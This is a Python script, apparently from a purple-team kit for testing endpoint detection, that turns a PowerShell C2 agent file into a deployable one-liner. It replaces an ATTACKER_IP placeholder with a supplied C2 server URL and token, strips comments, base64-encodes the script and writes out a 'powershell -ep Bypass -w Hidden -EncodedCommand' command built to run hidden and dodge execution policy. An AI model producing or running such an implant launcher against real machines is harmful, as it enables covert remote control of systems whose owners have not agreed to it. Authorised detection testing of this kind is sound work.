#!/usr/bin/env python3
"""
Generates a paste-ready PowerShell one-liner from windows-noadmin.ps1.
Replaces ATTACKER_IP with your actual IP and base64-encodes for -EncodedCommand.

Usage:
    python3 generate-oneliner.py --c2 http://10.0.0.5:8443
    python3 generate-oneliner.py --c2 http://10.0.0.5:8443 --token mytoken
"""

import argparse
import base64
from pathlib import Path


def main():
    parser = argparse.ArgumentParser(description="Generate paste-ready PowerShell one-liner")
    parser.add_argument("--c2", required=True, help="Your C2 server URL (e.g. http://10.0.0.5:8443)")
    parser.add_argument("--token", default="purpleteam-xdr-test-2024", help="Auth token")
    args = parser.parse_args()

    agent = Path(__file__).parent / "windows-noadmin.ps1"
    code = agent.read_text()
    code = code.replace("http://ATTACKER_IP:8443", args.c2)
    code = code.replace("purpleteam-xdr-test-2024", args.token)

    # Remove the comment block at top to shrink it
    lines = code.split("\n")
    clean = []
    in_comment = False
    for line in lines:
        if line.strip().startswith("<#"):
            in_comment = True
            continue
        if "#>" in line:
            in_comment = False
            continue
        if in_comment:
            continue
        clean.append(line)
    code = "\n".join(clean)

    encoded = base64.b64encode(code.encode("utf-16-le")).decode()

    print("=" * 60)
    print("PASTE-READY OPTIONS")
    print("=" * 60)

    print("\n[1] EncodedCommand (safest, single paste):\n")
    print(f"powershell -ep Bypass -w Hidden -EncodedCommand {encoded}")

    print(f"\n[2] Direct paste into existing PowerShell:\n")
    print(code)

    # Save to files
    out = Path(__file__).parent
    (out / "encoded-cmd.txt").write_text(
        f"powershell -ep Bypass -w Hidden -EncodedCommand {encoded}"
    )
    (out / "paste-agent.ps1").write_text(code)

    print("\n" + "=" * 60)
    print(f"Saved: encoded-cmd.txt  (one-liner, {len(encoded)} chars)")
    print(f"Saved: paste-agent.ps1  (clean script)")
    print("=" * 60)


if __name__ == "__main__":
    main()
